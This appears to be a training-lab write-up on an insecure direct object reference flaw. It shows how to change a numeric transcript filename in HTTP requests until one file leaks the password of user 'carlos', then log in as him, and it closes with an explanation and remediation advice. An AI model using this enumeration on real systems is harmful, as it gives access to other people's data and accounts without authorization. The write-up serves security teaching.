# Insecure Direct Object References (IDOR)

## Lab Goal

Retrieve the password for the user `carlos` and log in to his account.

## Steps

### 1. Explore the Application

Browse the website and inspect the available functionality.

Navigate to one of the blog posts and look for a link to a transcript file.

Example request:

```http
GET /download-transcript/1.txt HTTP/1.1
Host: lab-id.web-security-academy.net
```

### 2. Examine the URL Structure

Notice that the transcript file is referenced directly by a numeric identifier:

```text
/download-transcript/1.txt
```

This suggests that other files may be accessible by modifying the identifier.

### 3. Test for IDOR

Intercept the request using Burp Suite and modify the filename.

Try requesting other files:

```http
GET /download-transcript/2.txt HTTP/1.1
Host: lab-id.web-security-academy.net
```

Continue enumerating available files:

```http
GET /download-transcript/3.txt HTTP/1.1
Host: lab-id.web-security-academy.net
```

### 4. Find Sensitive Information

One of the transcript files contains internal information, including credentials for the user `carlos`.

Example content:

```text
Username: carlos
Password: <password>
```

Copy the discovered password.

### 5. Log In as Carlos

Navigate to the login page and authenticate using the leaked credentials:

```text
Username: carlos
Password: <discovered_password>
```

### 6. Lab Solved

After successfully logging in as Carlos, the lab is completed.

---

## Vulnerability Explanation

An Insecure Direct Object Reference (IDOR) occurs when an application exposes a direct reference to an internal object (such as a file, database record, or user account) without verifying whether the current user is authorized to access it.

In this lab:

* Transcript files are identified by predictable filenames.
* The application does not perform authorization checks.
* Attackers can enumerate files by modifying the identifier.
* Sensitive information belonging to other users becomes accessible.

## Impact

* Unauthorized access to sensitive data
* Exposure of credentials
* Privacy violations
* Potential account compromise

## Remediation

* Implement server-side authorization checks for every object request.
* Avoid exposing predictable object identifiers.
* Use indirect references such as random UUIDs.
* Apply the principle of least privilege.
* Log and monitor unauthorized access attempts.
